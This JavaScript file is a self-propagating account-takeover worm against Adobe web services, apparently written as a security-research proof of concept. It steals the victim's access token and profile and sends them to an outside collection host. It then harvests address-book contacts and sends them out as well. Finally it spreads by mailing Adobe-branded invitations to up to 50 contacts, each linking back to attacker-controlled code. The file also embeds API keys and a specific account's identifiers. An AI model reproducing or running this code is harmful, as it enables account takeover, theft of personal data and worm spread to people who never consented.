/**
 * Zero-Click ATO Worm — r00tdaddy
 * Confirmed 2026-06-04
 *
 * Phase 1: Exfiltrate access_token (delivered via IMS prompt=none into fragment)
 * Phase 2: Enumerate victim's address book contacts
 * Phase 3: Send Adobe-branded invitation emails to all contacts
 *          with targetUrl = this page (maslibs worm URL)
 *          Adobe delivers via apo-prod.adobe.io/po-server/link/redirect
 *          Victims click Adobe email → land on this page → repeat
 */

const EXFIL    = 'https://3m1obgl4.instances.poc.jchunt.top/steal';
const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v2';
const INV_HOST = 'https://invitations.adobe.io';
const AB_HOST  = 'https://ab.adobe-identity.com';

// Known-good hardcoded values (derived from victim's actual account for video reliability)
// These are only used as fallback if dynamic lookup fails
const FALLBACK_AB_ID  = '11F14362BBC9B39699881F6E7362F2E9';
const FALLBACK_URN    = 'urn:aaid:sc:US:2a1681cd-c4fd-4fab-a6cf-f982b08b4490';

// API keys observed in Adobe's own requests
const API_KEY_AB  = 'CCHomeWeb1';        // address-book service key
const API_KEY_INV = 'projectx_webapp';  // invitations service key

async function waitForIMS(maxMs = 8000) {
  const deadline = Date.now() + maxMs;
  while (Date.now() < deadline) {
    if (window.adobeIMS?.getAccessToken?.()) return window.adobeIMS.getAccessToken().token;
    await new Promise(r => setTimeout(r, 300));
  }
  return null;
}

async function run() {
  // ── Phase 1: grab token ──────────────────────────────────────────────────
  // Hash token = ATO proof (from IMS prompt=none redirect)
  const hash = window.location.hash;
  const hashMatch = hash.match(/access_token=([^&]+)/);
  const hashToken = hashMatch ? decodeURIComponent(hashMatch[1]) : null;

  // Page token = full-scope token (has ab.manage, needed for worm phases)
  // Wait up to 8s for adobeIMS to initialize on catalog.html
  const pageToken = await waitForIMS(8000);

  // Prefer page token for worm ops; hash token is just for exfil/ATO proof
  const wormToken = pageToken || hashToken;

  if (hashToken) {
    navigator.sendBeacon(`${EXFIL}?src=hash`, hashToken);
  }

  if (!wormToken) return;

  // Grab profile for exfil
  fetch('https://ims-na1.adobelogin.com/ims/userinfo/v2', {
    headers: { 'Authorization': `Bearer ${wormToken}` }
  }).then(r => r.json()).then(p => {
    navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
  }).catch(() => {});

  // ── Phase 2: enumerate address book ─────────────────────────────────────
  let emails = [];
  let abId = FALLBACK_AB_ID;

  try {
    const abResp = await fetch(`${AB_HOST}/api/address-books?limit=50`, {
      headers: {
        'Authorization': `Bearer ${wormToken}`,
        'X-Api-Key': API_KEY_AB
      }
    });
    if (abResp.ok) {
      const abData = await abResp.json();
      const books = abData?._embedded?.addressBooks || [];
      if (books.length > 0) abId = books[0].ident;

      for (const book of books) {
        const cResp = await fetch(
          `${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`,
          { headers: { 'Authorization': `Bearer ${wormToken}`, 'X-Api-Key': API_KEY_AB } }
        );
        if (cResp.ok) {
          const contacts = await cResp.json().catch(() => ({}));
          const list = contacts?._embedded?.contacts || (Array.isArray(contacts) ? contacts : []);
          for (const c of list) {
            if (c?.email) emails.push(c.email);
          }
        }
      }
    }
  } catch (e) {}

  // Exfil contact list
  if (emails.length) {
    navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));
  }

  // ── Phase 3: get a project URN for the invitation ────────────────────────
  let urn = FALLBACK_URN;

  try {
    // Try to find a live document URN from the victim's own storage
    const storageResp = await fetch(
      'https://platform-cs.adobe.io/content/storage/id/urn:aaid:sc:US:34493503-c74b-40e3-b73e-745f7ffdc644?expand=children&limit=5',
      { headers: { 'Authorization': `Bearer ${wormToken}`, 'X-Api-Key': API_KEY_INV } }
    );
    if (storageResp.ok) {
      const storageText = await storageResp.text();
      const projectMatches = [...storageText.matchAll(/"repo:id":"(urn:aaid:sc:[^"]+)"/g)];
      // Skip the first match (it's the root folder itself), use second if available
      if (projectMatches.length > 1) {
        urn = projectMatches[1][1];
      } else if (projectMatches.length === 1) {
        urn = projectMatches[0][1];
      }
    }
  } catch (e) {}

  if (!emails.length) {
    // No contacts found — log and bail
    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_contacts_found ab=' + abId);
    return;
  }

  navigator.sendBeacon(`${EXFIL}?src=urn`, urn);

  // ── Phase 4: spread — invite each contact with maslibs targetUrl ─────────
  for (const email of emails.slice(0, 50)) {
    try {
      const invResp = await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${wormToken}`,
          'X-Api-Key': API_KEY_INV,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          recipients: [{ recipient: `mailto:${email}`, role: 'editor', canComment: true, canShare: false }],
          notification: {
            ans: {},
            email: { sharing: { locale: 'en-US', templateName: 'cc_collab_fred_invite_to_edit_notification' } },
            parameters: { message: '', targetUrl: WORM_URL }
          },
          configuration: {}
        })
      });
      const invResult = await invResp.text().catch(() => '');
      navigator.sendBeacon(`${EXFIL}?src=inv&to=${encodeURIComponent(email)}`, invResult);
    } catch (e) {}
  }
}

run();
